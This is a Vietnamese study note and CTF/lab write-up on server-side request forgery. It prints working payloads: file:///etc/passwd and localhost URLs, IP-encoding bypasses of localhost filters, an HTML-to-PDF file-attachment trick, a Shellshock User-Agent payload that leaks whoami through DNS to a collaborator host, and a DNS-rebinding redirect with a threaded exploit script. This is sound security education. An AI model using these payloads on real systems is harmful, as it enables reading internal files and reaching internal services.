## 🛰️ Server-side Request Forgery (SSRF)

SSRF là lỗ hổng bảo mật cho phép attacker lợi dụng máy chủ để gửi request đến các dịch vụ nội bộ (localhost, database, metadata…). Hiểu đơn giản: giống như gọi điện cho bạn nhờ mẹ bạn chuyển tiền → mẹ tưởng là bạn → chuyển thật.

---

### 📌 VD1: Truy cập nội bộ bằng giao thức đặc biệt

- Ví dụ route `/upload?file_url=` nhận URL ảnh và tải về server.
- Nếu không kiểm tra kỹ, attacker có thể nhập:
  ```
  /upload?file_url=file:///etc/passwd
  /upload?file_url=http://localhost:1337/data
  /upload?file_url=tcp://127.0.0.1:11211
  ```
- Nếu kết quả được lưu tại public URL, attacker sẽ truy cập được dữ liệu nội bộ.

---

### 📌 VD2: Bypass blacklist bằng encoding

- Server chặn `localhost` và `127.0.0.1`
- Dùng IP dạng decimal, short IP:
  ```
  http://2130706433
  http://127.1
  ```
- Hoặc trỏ subdomain của mình về `127.0.0.1` để bypass

---

### 📌 VD3: Redirect SSRF

- Nếu server thực hiện DNS trước rồi mới kiểm tra hostname → thử redirect 3xx
- Sử dụng domain `redirect.url.com` trỏ về nội bộ → vượt qua check → redirect đến nội bộ

---

### 📌 VD4: SSRF qua HTML to PDF

**Challenge:** [HTML to PDF - CookieArena](https://battle.cookiearena.org/challenges/web/html-to-pdf)

**Ý tưởng:** gửi HTML có chứa link file nội bộ → server convert PDF → gửi lại → extract file

**Bước thực hiện:**

1. Tạo file `index.html`
   ```html
   <link rel=attachment href="file:///flag.txt">
   ```

2. Mở server:
   ```bash
   python3 -m http.server 8888
   ngrok http 8888
   ```

3. Gửi link đến HTML thông qua web chuyển PDF

4. Nhận file PDF về, dùng `pdfdetach` extract file:
   ```bash
   pdfdetach -list output.pdf
   pdfdetach -save 1 -o flag.txt output.pdf
   ```

---

### 📌 VD5: Blind SSRF + Shellshock

**Challenge:** [SSRF Shellshock - PortSwigger](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)

**Payload:**
```bash
() { :; }; /usr/bin/nslookup $(whoami).xxxxx.burpcollaborator.net
```

- Inject vào `User-Agent`, đợi DNS lookup đến collaborator để xác minh payload chạy → có thể leak `whoami`, `hostname`, etc.

---

### 📌 VD6: DNS Rebinding - SSRF nâng cao

**Challenge:** [difference-check - CookieArena](https://battle.cookiearena.org/challenges/web/difference-check)

**Ý tưởng:** Server resolve domain 2 lần → ta điều khiển DNS trả IP khác nhau ở mỗi lần → bypass được `validate_url()`

**Code mẫu của server:**
```python
def validate_url(url):
    ip = socket.gethostbyname(urlparse(url).hostname)
    if ip.startswith("127."):
        return False
```

**Kỹ thuật:**
1. DNS lần đầu → trỏ về IP hợp lệ
2. DNS lần hai → trỏ về `127.0.0.1`

**Tấn công bằng redirect:**
```php
<?php
$temp = rand(0, 1);
if ($temp == 1) {
  header("Location: http://localhost:1337/flag");
}
?>
```

**Chạy server:**
```bash
php -S 0.0.0.0:1234
ngrok http 1234
```

**payload.py**
```python
import requests
from threading import Thread

chall_url = 'http://difference-check.chal.idek.team'
my_url = "http://<YOUR_NGROK>.ngrok.io"

def payload():
    data = {"url1": my_url, "url2": "http://google.com"}
    r = requests.post(chall_url+'/diff', data=data)
    print(r.text)

if __name__ == '__main__':
    for i in range(1, 5):
        Thread(target=payload).start()
```

**Run:**
```bash
python3 payload.py | grep 'flag{'
```

> 🎯 Dựa vào độ "nhân phẩm" để may ra redirect về đúng `localhost`.
